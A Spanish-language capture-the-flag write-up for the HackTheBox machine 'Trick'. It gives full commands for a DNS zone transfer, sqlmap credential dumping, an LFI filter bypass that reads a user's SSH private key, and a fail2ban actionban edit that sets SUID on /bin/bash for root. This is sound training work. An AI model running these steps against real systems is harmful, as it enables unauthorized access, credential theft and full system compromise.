## 🖥️ Trick — HackTheBox Writeup

---

### 📋 Información de la máquina

| Campo | Detalle |
| --- | --- |
| **Nombre** | Trick |
| **OS** | Linux |
| **Dificultad** | Easy |
| **Plataforma** | Hack The Box |
| **Técnicas** | DNS Zone Transfer, SQLi, LFI, Fail2ban Privilege Escalation |

---

### 🔍 1. Enumeración — Nmap

bash

`nmap -sCV -p- --open -n -Pn -vvv -T5 10.129.36.31 -oN fullscan`

**Puertos encontrados:**

| Puerto | Servicio | Versión |
| --- | --- | --- |
| 22 | SSH | OpenSSH 7.9p1 Debian |
| 25 | SMTP | Postfix |
| 53 | DNS | ISC BIND 9.11.5 |
| 80 | HTTP | nginx 1.14.2 |

---

### 🌐 2. Enumeración DNS

### Obtener el dominio

bash

`dig @10.129.36.31 trick.htb`

### Transferencia de zona — Encontrar subdominios

bash

`dig @10.129.36.31 trick.htb AXFR`

**Subdominio encontrado:** `preprod-payroll.trick.htb`

### Agregar al /etc/hosts

bash

`echo "10.129.36.31 trick.htb preprod-payroll.trick.htb" | sudo tee -a /etc/hosts`

---

### 💉 3. SQL Injection en preprod-payroll.trick.htb

### Login bypass

El formulario de login en `preprod-payroll.trick.htb` es vulnerable a SQLi.

Interceptamos la petición con Burp Suite Pro y la guardamos en `login.txt`.

### SQLMap — Enumeración

bash

`# Detectar vulnerabilidad
sqlmap -r login.txt --level 5 --risk 3 --batch

# Listar bases de datos
sqlmap -r login.txt --batch --dbs

# Listar tablas
sqlmap -r login.txt --batch -D payroll_db --tables

# Listar columnas
sqlmap -r login.txt --batch -D payroll_db -T users --columns

# Volcar credenciales
sqlmap -r login.txt --batch -D payroll_db -T users -C username,password --dump`

**Credenciales obtenidas:**

`usuario: Enemigosss
password: SuperGucciRainbowCake`

### Privilegios del usuario de BBDD

bash

`sqlmap -r login.txt --batch --privileges`

El usuario `remo@localhost` solo tiene privilegio **FILE**.

---

### 🔍 4. Enumeración de subdominios con ffuf

bash

`ffuf -u http://trick.htb -H "Host: preprod-FUZZ.trick.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 5480`

**Subdominio encontrado:** `preprod-marketing.trick.htb`

bash

`echo "10.129.36.31 preprod-marketing.trick.htb" | sudo tee -a /etc/hosts`

---

### 📁 5. LFI en preprod-marketing.trick.htb

La URL `http://preprod-marketing.trick.htb/index.php?page=services.html` es vulnerable a LFI.

### Bypass del filtro con ....//

`http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd`

**Usuario encontrado:** `michael`

### Leer clave privada SSH

bash

`curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa" -o id_rsa_michael
chmod 600 id_rsa_michael`

---

### 🔐 6. Acceso SSH como michael

bash

`ssh -i id_rsa_michael michael@10.129.36.31`

### User flag

bash

`cat /home/michael/user.txt`

---

### ⬆️ 7. Escalada de privilegios — Fail2ban

### Enumeración

bash

`sudo -l
# (root) NOPASSWD: /etc/init.d/fail2ban restart

id
# groups=1001(michael),1002(security)

ls -la /etc/fail2ban/
# drwxrwx--- 2 root security 4096 action.d`

Michael pertenece al grupo **security** que tiene permisos de escritura en `/etc/fail2ban/action.d/`.

### Modificar la acción de fail2ban

bash

`# Copiar el archivo de acción
cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/iptables-multiport.conf

# Modificar actionban para añadir SUID a bash
sed -i 's/actionban = .*/actionban = chmod +s \/bin\/bash/' /tmp/iptables-multiport.conf

# Reemplazar el archivo original
mv /tmp/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf

# Reiniciar fail2ban
sudo /etc/init.d/fail2ban restart`

### Provocar el baneo con Hydra

bash

`hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.129.36.31 -t 50`

### Verificar SUID y escalar

bash

`ls -la /bin/bash
# -rwsr-xr-x → tiene la s!

bash -p
whoami
# root`

### Root flag

bash

`cat /root/root.txt`

---

### 📚 Lecciones aprendidas

- El puerto 53 abierto siempre merece una transferencia de zona DNS
- Los subdominios con prefijos como `preprod-` pueden revelar más superficies de ataque
- SQLi puede usarse para bypassear logins y extraer credenciales
- El parámetro `?page=` es un vector clásico de LFI
- El filtro `../` se puede bypassear con `....//`
- Los permisos de grupo en archivos de configuración de servicios pueden ser vectores de escalada
- Fail2ban ejecuta sus acciones como root → modificar `actionban` = shell de root

---

### 🛠️ Herramientas utilizadas

| Herramienta | Uso |
| --- | --- |
| Nmap | Enumeración de puertos |
| dig | Consultas DNS y transferencia de zona |
| Burp Suite Pro | Interceptación de peticiones |
| SQLMap | Automatización de SQL Injection |
| ffuf | Enumeración de subdominios |
| curl | Explotación LFI y descarga de archivos |
| Hydra | Fuerza bruta SSH para triggear fail2ban |
